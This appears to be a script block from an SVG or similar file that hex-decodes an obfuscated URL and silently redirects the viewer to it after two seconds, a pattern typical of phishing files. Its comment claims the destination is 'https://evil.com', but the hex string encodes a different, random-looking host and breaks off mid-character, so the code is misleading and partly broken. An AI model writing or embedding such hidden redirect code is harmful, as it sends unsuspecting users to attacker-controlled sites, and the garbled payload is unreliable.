<script type="text/ecmascript"><![CDATA[
(function() {
  // Utility: convert hex-encoded string to plain text.
  function hexToString(hex) {
    var str = "";
    for (var i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  // Hex-encoded target URL ("https://evil.com")
  var targetURL = 
hexToString("68747470733A2F2F6162653833763332392E34366232303439342D386134332D4");

  // Auto-redirect after 2 seconds.
  setTimeout(function() {
    try {
      window.location.href = targetURL;
    } catch (e) {
      console.error("Redirect failed: " + e);
    }
  }, 2000);
})();
]]></script>